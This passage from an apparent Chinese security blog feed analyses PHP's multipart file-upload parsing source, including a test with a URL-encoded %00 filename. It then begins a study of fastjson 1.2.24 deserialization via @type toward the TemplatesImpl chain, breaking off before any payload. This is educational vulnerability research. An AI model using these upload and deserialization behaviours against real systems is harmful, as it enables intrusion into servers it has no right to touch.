&amp;&amp; *pos != stop) &#123;</span><br><span class="line">    <span class="comment">//读取到&quot;或者&#x27;的位置，获取符号后面的数据</span></span><br><span class="line"><span class="keyword">if</span> ((quote = *pos) == <span class="string">&#x27;&quot;&#x27;</span> || quote == <span class="string">&#x27;\&#x27;&#x27;</span>) &#123;</span><br><span class="line">++pos;</span><br><span class="line"><span class="keyword">while</span> (*pos &amp;&amp; *pos != quote) &#123;</span><br><span class="line">        <span class="comment">//如果获取符号中存在\+quote，会跳过\符号，取quote值，比如&quot;test\&quot;,就会忽略掉\符号得到&quot;test&quot;</span></span><br><span class="line"><span class="keyword">if</span> (*pos == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; pos[<span class="number">1</span>] &amp;&amp; pos[<span class="number">1</span>] == quote) &#123;</span><br><span class="line">pos += <span class="number">2</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">++pos;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (*pos) &#123;</span><br><span class="line">++pos;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> ++pos;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (*pos == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">res = estrdup(*line);</span><br><span class="line">*line += <span class="built_in">strlen</span>(*line);</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = estrndup(*line, pos - *line);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (*pos == stop) &#123;</span><br><span class="line">++pos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*line = pos;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getword_conf:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">php_ap_getword_conf</span><span class="params">(<span class="type">const</span> zend_encoding *encoding, <span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//判断当前str指针是否存在且是否为空</span></span><br><span class="line">  <span class="keyword">while</span> (*str &amp;&amp; <span class="built_in">isspace</span>(*str)) &#123;</span><br><span class="line">++str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果str指针索引循环完不存在的话，表示空，指向&quot;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> (!*str) &#123;</span><br><span class="line"><span class="keyword">return</span> estrdup(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//索引到以&quot;或者&#x27;的时候，调用substring_conf方法开始从&quot;或者&#x27;字符的后一位开始选取</span></span><br><span class="line">  <span class="keyword">if</span> (*str == <span class="string">&#x27;&quot;&#x27;</span> || *str == <span class="string">&#x27;\&#x27;&#x27;</span>) &#123;</span><br><span class="line"><span class="type">char</span> quote = *str;</span><br><span class="line"></span><br><span class="line">str++;</span><br><span class="line"><span class="keyword">return</span> substring_conf(str, (<span class="type">int</span>)<span class="built_in">strlen</span>(str), quote);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">char</span> *strend = str;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (*strend &amp;&amp; !<span class="built_in">isspace</span>(*strend)) &#123;</span><br><span class="line">++strend;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> substring_conf(str, strend - str, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">substring_conf</span><span class="params">(<span class="type">char</span> *start, <span class="type">int</span> len, <span class="type">char</span> quote)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *result = emalloc(len + <span class="number">1</span>);</span><br><span class="line"><span class="type">char</span> *resp = result;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len &amp;&amp; start[i] != quote; ++i) &#123;</span><br><span class="line">    <span class="comment">//判断字符中存在\\或者\&#x27; \&quot;的情况，进行跳过</span></span><br><span class="line"><span class="keyword">if</span> (start[i] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; (start[i + <span class="number">1</span>] == <span class="string">&#x27;\\&#x27;</span> || (quote &amp;&amp; start[i + <span class="number">1</span>] == quote))) &#123;</span><br><span class="line">*resp++ = start[++i];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">*resp++ = start[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*resp = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="上传文件限制判断"><a href="#上传文件限制判断" class="headerlink" title="上传文件限制判断"></a>上传文件限制判断</h2><p>继续回到主体中，获取了filename或者name后，接下来对上传主体进行默认的php上传限制判断</p><p><img src="/posts/9fa41563/php-9.png" title="限制判断"></p><p>经过php的默认上传限制判断后，再查看用户提交参数中是否存在MAX_FILE_SIZE字段，即用户定义的上传大小上限，通过自定义大小判断用户上传文件是否超过大小，因此MAX_FILE_SIZE并不能超过PHP中设置的最大上传文件大小。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!strcasecmp(param, <span class="string">&quot;MAX_FILE_SIZE&quot;</span>)) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_ATOLL</span></span><br><span class="line">max_file_size = atoll(value);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">max_file_size = strtoll(value, <span class="literal">NULL</span>, <span class="number">10</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">efree(param);</span><br><span class="line">efree(value);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断完大小后，再判断是否进行文件上传<br><img src="/posts/9fa41563/php-10.png" title="是否文件上传"></p><p>如果是文件上传，会进行一个判断，判断param参数（即name参数）</p><ul><li>当name值只存在]字符，即skip_upload &#x3D; 1成立，会忽略上传的文件，如：name]</li><li>当name值只存在[字符，即skip_upload &#x3D; 1成立，会忽略上传的文件，如：name[</li><li>当name值存在[]两个字符，且[位于字段开头位置，c值为0，但实际测试过程还是会上传失败，如：[name]</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* New Rule: never repair potential malicious user input */</span></span><br><span class="line"><span class="keyword">if</span> (!skip_upload) &#123;</span><br><span class="line"><span class="type">long</span> c = <span class="number">0</span>;</span><br><span class="line">tmp = param;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (*tmp) &#123;</span><br><span class="line"><span class="keyword">if</span> (*tmp == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">c++;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (*tmp == <span class="string">&#x27;]&#x27;</span>) &#123;</span><br><span class="line">c--;</span><br><span class="line"><span class="keyword">if</span> (tmp[<span class="number">1</span>] &amp;&amp; tmp[<span class="number">1</span>] != <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">skip_upload = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (c &lt; <span class="number">0</span>) &#123;</span><br><span class="line">skip_upload = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">tmp++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Brackets should always be closed */</span></span><br><span class="line"><span class="keyword">if</span>(c != <span class="number">0</span>) &#123;</span><br><span class="line">skip_upload = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>parm来源，为获取参数name的值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//parm来源</span></span><br><span class="line">     <span class="keyword">if</span> (!strcasecmp(key, <span class="string">&quot;name&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (param) &#123;</span><br><span class="line">efree(param);</span><br><span class="line">&#125;</span><br><span class="line">param = getword_conf(mbuff-&gt;input_encoding, <span class="built_in">pair</span>);</span><br></pre></td></tr></table></figure><p>上传失败：</p><p><img src="/posts/9fa41563/php-11.png" title="上传失败"></p><p>后面对文件名的判断,判断文件名是否开头为结尾符号（’\0’表示代码结尾）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (filename[<span class="number">0</span>] == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG_FILE_UPLOAD</span></span><br><span class="line">sapi_module.sapi_error(E_NOTICE, <span class="string">&quot;No file uploaded&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">cancel_upload = UPLOAD_ERROR_D;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/9fa41563/php-12.png" title="filename开头判断"></p><p>将%00进行Url编码后上传，即出现错误</p><p><img src="/posts/9fa41563/php-13.png" title="filename开头判断"></p><h2 id="临时文件创建"><a href="#临时文件创建" class="headerlink" title="临时文件创建"></a>临时文件创建</h2><p>文件正常上传判断后，通过<code>php_open_temporary_fd_ex</code>方法创建临时文件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">fd = php_open_temporary_fd_ex(PG(upload_tmp_dir), <span class="string">&quot;php&quot;</span>, &amp;temp_filename, </span><br><span class="line">PHP_TMP_FILE_OPEN_BASEDIR_CHECK_ON_FALLBACK);</span><br><span class="line">upload_cnt--;</span><br><span class="line"><span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">sapi_module.sapi_error(E_WARNING, <span class="string">&quot;File upload error - unable to create a temporary file&quot;</span>);cancel_upload = UPLOAD_ERROR_E;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>php_open_temporary_fd_ex</code>方法中再通过调用<code>php_do_open_temporary_file</code>方法进行创建文件，最后返回随机临时文件名</p><p><img src="/posts/9fa41563/php-14.png" title="临时文件创建"></p><p>文件名路径会根据php环境选取对应的默认临时路径</p><p><img src="/posts/9fa41563/php-16.png" title="临时文件创建"></p><p>临时文件名格式为<code>php</code>+<code>随机字符</code>+<code>.tmp</code>结尾</p><p><img src="/posts/9fa41563/php-15.png" title="临时文件创建"></p><p>经过文件名、大小的判断过后通过<code>write</code>方法将文件写入临时文件</p><p><img src="/posts/9fa41563/php-17.png" title="临时文件创建"></p><p>然后通过<code>zend_string_release_ex</code>方法对临时文件进行释放（我理解为关闭释放掉临时文件写入的进程管道）</p><p><img src="/posts/9fa41563/php-18.png" title="临时文件释放"></p><p>对parm参数的数组情况进行对应处理后，进入对filename的安全过滤处理</p><h2 id="filename安全过滤"><a href="#filename安全过滤" class="headerlink" title="filename安全过滤"></a>filename安全过滤</h2><p>有一段注释描述在windows环境下由于特殊符号对路径的影响，所以对filename进行了一些安全处理</p><p>通过php_ap_basename方法对filename进行安全过滤</p><p><img src="/posts/9fa41563/php-19.png" title="安全过滤"></p><p>下列代码对filename进行\或者&#x2F;进行匹配，匹配到的话，就获取最后一个斜线后的内容，前面的内容进行跳过</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">php_ap_basename</span><span class="params">(<span class="type">const</span> zend_encoding *encoding, <span class="type">char</span> *path)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *s = <span class="built_in">strrchr</span>(path, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line"><span class="type">char</span> *s2 = <span class="built_in">strrchr</span>(path, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s &amp;&amp; s2) &#123;</span><br><span class="line"><span class="keyword">if</span> (s &gt; s2) &#123;</span><br><span class="line">++s;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">s = ++s2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (s) &#123;</span><br><span class="line"><span class="keyword">return</span> ++s;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (s2) &#123;</span><br><span class="line"><span class="keyword">return</span> ++s2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="/posts/9fa41563/php-20.png" title="安全过滤"><br><img src="/posts/9fa41563/php-21.png" title="安全过滤"></p><p>最后后面的就是针对各个参数生成$_FILES内容，没有了其它的过滤。</p><h1 id="0x03、调试分析"><a href="#0x03、调试分析" class="headerlink" title="0x03、调试分析"></a>0x03、调试分析</h1><p>主机原因先缺着，后面再补</p><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>在没有找到分析文章前，看着是真的费力，理解上很容易跑偏，学习他们的分析文章再看，可能过程中也有理解错的地方，总体也只是对rfc1867协议的部分内容进行浅析，协议的完整处理过程还是理解不全。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://www.laruence.com/2009/09/26/1103.html">https://www.laruence.com/2009/09/26/1103.html</a><br><a href="https://blog.csdn.net/gnaw0725/article/details/45869847">https://blog.csdn.net/gnaw0725/article/details/45869847</a><br><a href="https://xz.aliyun.com/t/11486#toc-10">https://xz.aliyun.com/t/11486#toc-10</a></p>]]></content>
      
      
      <categories>
          
          <category> php安全 </category>
          
          <category> php内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php安全 </tag>
            
            <tag> php内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-fastjson及其TemplatesImpl链学习与分析</title>
      <link href="/posts/ad3be047.html"/>
      <url>/posts/ad3be047.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>本文学习fastjson以及在1.2.24版本下的TemplatesImpl链利用，学习下分析思路，尽量理解漏洞在源码上的触发过程。</p><h1 id="0x01、fastjson描述"><a href="#0x01、fastjson描述" class="headerlink" title="0x01、fastjson描述"></a>0x01、fastjson描述</h1><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。<br>官方地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a><br>官方中文地址：<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p><p>优点：</p><ul><li>性能速度快</li><li>使用广泛</li><li>测试完备（虽然现在各版本爆出来的问题有点多）</li><li>使用简单</li><li>功能完备</li></ul><p>格式跟jackson很像，区别jackson数据要求比较严格，其中提交的数据只能为对应Javabean的key，不能添加多余不在javabean的key进行提交，因此会报错，而fastjson不会</p><p>新建maven项目，然后环境添加：<br>直接添加对应版本到maven依赖即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/fj1-1.png" title="添加依赖"></p><h1 id="0x02、fastjson简单使用"><a href="#0x02、fastjson简单使用" class="headerlink" title="0x02、fastjson简单使用"></a>0x02、fastjson简单使用</h1><p>主要学习序列化和反序列化接口<br>简单使用：<br>创建基础实例类People类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">People</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用People类构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="序列化-toJSONString"><a href="#序列化-toJSONString" class="headerlink" title="序列化-toJSONString()"></a>序列化-toJSONString()</h2><p>还有一些其它的序列化方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将Java对象序列化为JSON字符串，支持各种各种Java基本类型和JavaBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toJSONString</span><span class="params">(Object object, SerializerFeature... features)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将Java对象序列化为JSON字符串，返回JSON字符串的utf-8 bytes</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toJSONBytes(Object object, SerializerFeature... features);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将Java对象序列化为JSON字符串，写入到Writer中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeJSONString</span><span class="params">(Writer writer, </span></span><br><span class="line"><span class="params">                                   Object object, </span></span><br><span class="line"><span class="params">                                   SerializerFeature... features)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将Java对象序列化为JSON字符串，按UTF-8编码写入到OutputStream中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">writeJSONString</span><span class="params">(OutputStream os,</span></span><br><span class="line"><span class="params">                                        Object object,</span></span><br><span class="line"><span class="params">                                        SerializerFeature... features)</span>;</span><br></pre></td></tr></table></figure><p>序列化toJSONString()的使用：<br><code>JSON.toJSONString(Class class)</code><br><code>JSON.toJSONString(Class class,SerializerFeature ...)</code>可以使用SerializerFeature.WriteClassName参数将类名加到序列化json字段的@type中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        People people=<span class="keyword">new</span> <span class="title class_">People</span>();</span><br><span class="line">        people.setName(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        Object fj=JSON.toJSONString(people);</span><br><span class="line">        System.out.println(fj);</span><br><span class="line">        Object fj2=JSON.toJSONString(people, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(fj2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/fj1-2.png" title="toJSONString()的使用"></p><h2 id="反序列化-parseObject-、parse-、parseArray"><a href="#反序列化-parseObject-、parse-、parseArray" class="headerlink" title="反序列化-parseObject()、parse()、parseArray()"></a>反序列化-parseObject()、parse()、parseArray()</h2><p>还有一些其他不同参数的使用方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将JSON字符串反序列化为JavaBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">parseObject</span><span class="params">(String jsonStr, </span></span><br><span class="line"><span class="params">                                Class&lt;T&gt; clazz, </span></span><br><span class="line"><span class="params">                                Feature... features)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将JSON字符串反序列化为JavaBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">parseObject</span><span class="params">(<span class="type">byte</span>[] jsonBytes,  // UTF-<span class="number">8</span>格式的JSON字符串</span></span><br><span class="line"><span class="params">                                Class&lt;T&gt; clazz, </span></span><br><span class="line"><span class="params">                                Feature... features)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将JSON字符串反序列化为泛型类型的JavaBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">parseObject</span><span class="params">(String text, </span></span><br><span class="line"><span class="params">                                TypeReference&lt;T&gt; type, </span></span><br><span class="line"><span class="params">                                Feature... features)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将JSON字符串反序列为JSONObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span>;</span><br></pre></td></tr></table></figure><p>反序列化parseObject()、parse()用法<br><code>JSON.parseObject()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        People people=<span class="keyword">new</span> <span class="title class_">People</span>();</span><br><span class="line">        <span class="comment">//第一种方式</span></span><br><span class="line">        String parse=<span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;李四\&quot;&#125;&quot;</span>;</span><br><span class="line">        Object parfj=JSON.parseObject(parse,People.class);</span><br><span class="line">        System.out.println(parfj);</span><br><span class="line">        <span class="comment">//第二种方式效果同上</span></span><br><span class="line">        String parse2=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.test.fastjson.People\&quot;,\&quot;name\&quot;:\&quot;李四\&quot;&#125;&quot;</span>;</span><br><span class="line">        Object parfj2=JSON.parseObject(parse2);</span><br><span class="line">        System.out.println(parfj2);</span><br><span class="line">        <span class="comment">//第三种方式</span></span><br><span class="line">        String parse2=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.test.fastjson.People\&quot;,\&quot;name\&quot;:\&quot;李四\&quot;&#125;&quot;</span>;</span><br><span class="line">        Object parfj2=JSON.parse(parse2);</span><br><span class="line">        System.out.println(parfj2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/fj1-3.png" title="反序列化的使用"></p><ul><li>parseObject()方法，需要设置第二个参数(Class class)将序列化数据读取应用到对应类里，否则会返回JSON对象</li><li>parse()方法是直接将序列化数据应用到@type声明的类中，如果不声明@type变量，则会返回JSON对象。</li><li>parseArray()方法就是源数据是集合的形式（即[]中的内容）</li></ul><p>另外一些使用方法直接参考中文手册即可<br><a href="https://www.w3cschool.cn/fastjson/">https://www.w3cschool.cn/fastjson/</a></p><h2 id="getter-x2F-setter自动调用"><a href="#getter-x2F-setter自动调用" class="headerlink" title="getter&#x2F;setter自动调用"></a>getter&#x2F;setter自动调用</h2><p>在使用fastjson中，发现</p><ul><li><code>JSON.parseObject(parse2)</code>方法会自动调用目标类的构造方法、get方法和set方法。</li><li><code>JSON.parseObject(parse2,People.class)</code>和<code>JSON.parse(parse2)</code>方法只会调用目标类的构造方法和set方法</li></ul><h3 id="get方法调用"><a href="#get方法调用" class="headerlink" title="get方法调用"></a>get方法调用</h3><p><code>parseObject(parse2)</code>方法中会通过反射读取目标元素的getter获取值并存储在hashmap中<br><img src="/posts/ad3be047/fj1-8.png" title="parseObject方法"><br><img src="/posts/ad3be047/fj1-4.png" title="get方法调用"><br><img src="/posts/ad3be047/fj1-5.png" title="get方法调用"><br><img src="/posts/ad3be047/fj1-9.png" title="get方法调用"><br><img src="/posts/ad3be047/fj1-6.png" title="get方法调用"></p><h3 id="set方法、构造方法调用"><a href="#set方法、构造方法调用" class="headerlink" title="set方法、构造方法调用"></a>set方法、构造方法调用</h3><p>但在setter调用的调试中，只追到下图的包，通过deserialze()方法反射获取成员值，循环读取但是无法抓到每个获取方法的过程<br><img src="/posts/ad3be047/fj1-7.png" title="setter"></p><h3 id="getter-x2F-setter获取"><a href="#getter-x2F-setter获取" class="headerlink" title="getter&#x2F;setter获取"></a>getter&#x2F;setter获取</h3><p>上面提到在调用对应get或者set方法时，通过getter&#x2F;setter获取对应方法，然后直接调用在getter&#x2F;setter获取对应的成员值反序列化中的获取getter&#x2F;setter前的调用栈大体如下，没找到前面调用过程的文章，瞎跟了好一会，比较容易跟丢，后面按我理解跟出来的调用情况，用图展示的话拉的比较长，就用调用链形式展示，以反序列化调试展示</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSON.parseObject(String text)</span><br><span class="line">    -&gt;parse(text)</span><br><span class="line">        -&gt;parse(text, DEFAULT_PARSER_FEATURE)</span><br><span class="line">            -&gt;DefaultJSONParser.parse()</span><br><span class="line">                -&gt;parse(Object fieldName)</span><br><span class="line">                    -&gt;parseObject(object, fieldName)</span><br><span class="line">                        -&gt;TypeUtils.loadClass(typeName, config.getDefaultClassLoader()) <span class="comment">//通过type值反射获取类</span></span><br><span class="line">                        -&gt;ParserConfig.getDeserializer(Clazz)</span><br><span class="line">                            -&gt;getDeserializer(Class&lt;?&gt; clazz, Type type)</span><br><span class="line">                                -&gt;createJavaBeanDeserializer(clazz, type)</span><br><span class="line">                                    -&gt;JavaBeanInfo.build(clazz, type, propertyNamingStrategy)</span><br></pre></td></tr></table></figure><p>进入JavaBeanInfo.build()方法查看getter&#x2F;setter的设置情况<br>首先通过反射获取Clazz类的属性、方法、构造方法<br><img src="/posts/ad3be047/fj1-10.png" title="反射调用"></p><p>获取后，先是判断构造器是否为空，如果为空，则判断该类是否是接口或者抽象类，如果是的话，然后创建JSNOcreator注解，（底层源码没注解看着还是费劲好些流程不是特别明白）</p><p><img src="/posts/ad3be047/fj1-11.png" title="构造器判断"></p><h4 id="setter构建"><a href="#setter构建" class="headerlink" title="setter构建"></a>setter构建</h4><p>经过前面的一些判断，再到下面的setter构建，循环获取反射里的方法名</p><p><img src="/posts/ad3be047/fj1-12.png" title="getter/setter构建"></p><p>会经过几个条件判断:<br>条件判断，方法名长度不能小于4</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>条件判断，方法不能是静态方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件判断，方法的返回类型必须是void类型或者返回方法本身。主要是作用筛选是不是set方法，get方法会返回字符串就符合下面的判断</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>条件判断，方法的参数个数必须为1个</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line"><span class="keyword">if</span> (types.length != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>条件判断，方法名开头必须是set开头</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？</span></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件判断，判断TypeUtils.compatibleWithJavaBean是否开起，compatibleWithJavaBean为false表示首字母小写</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">    propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件判断，判断set后面的字母</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断第四个字符是否是以“_”或者“f”</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span 